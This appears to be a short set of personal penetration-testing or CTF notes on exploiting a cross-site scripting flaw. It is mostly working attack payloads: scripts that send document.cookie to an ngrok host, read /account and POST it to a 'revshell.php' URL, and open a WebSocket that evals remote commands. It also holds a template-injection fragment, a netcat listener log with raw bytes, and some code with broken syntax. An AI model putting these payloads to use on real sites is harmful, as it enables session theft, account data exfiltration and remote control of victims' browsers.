## first machine

## url

xss possible with <script>alert(1) </script> pops window with 1

  <script>
      fetch(`https://c2c4-196-115-229-24.ngrok-free.app?cookie=${encodeURIComponent(document.cookie)}`)
  </script>

 response 

	{% set config=None%}{% set self=None%} 
	
".PShpaULgVM97vcqo1cdPIGA045ZjAk8GjNgRkxPPzU-1709910396-1.0.1.1-z9EF4R_2rVaYssX5t88RbMGjULq7D0CXiSGq0fM9oEo3Uu2PY55WhIO1REdEKNdBRE.zda9oqGwaZWVcL2.Dww"

  <script>
      fetch('/account)
          .then(p => p.text())
          .then(t =>
            fetch('https://c2bf-196-115-229-24.ngrok-free.app/revshell.php, {
              method: "POST",
              headers: { 'Content-Type':'application/json' },
              body: JSON.stringify({p:t})
            })
         ) 
  </script>
  
  
  
  when setting up listeners it doesnt seem to ping back , trying burpsuite for forging requests  .
  
  
  it ping back now 
  
			  ┌──(kali㉿kali)-[~]
			└─$ nc -lvnp 8080
			listening on [any] 8080 ...
			connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42952
			CONNECT c2bf-196-115-229-24.ngrok-free.app:443 HTTP/1.1
			User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
			Proxy-Connection: keep-alive
			Connection: keep-alive
			Host: c2bf-196-115-229-24.ngrok-free.app:443

			id
			�u�_�����{��c�"��S6�~�*&kҽ�4,t ϰ��kZ�q\�T       +���G�CiԦc?s��1"�+�/�,�0�
			�       ����/5�'%"c2bf-196-115-229-24.ngrok-free.app�

			▒
			 #
			  hhttp/1.1"
			3ki )�l�!T\�RME�����Fm▒Ǘ��m�xZA�
						        �▒!��u��@kiT���
			-@t    
  
   <script>
     s = new WebSocket('wss:https://c2bf-196-115-229-24.ngrok-free.app/revshell.php')
     s.onmessage = e => eval(e.data)
  </script>
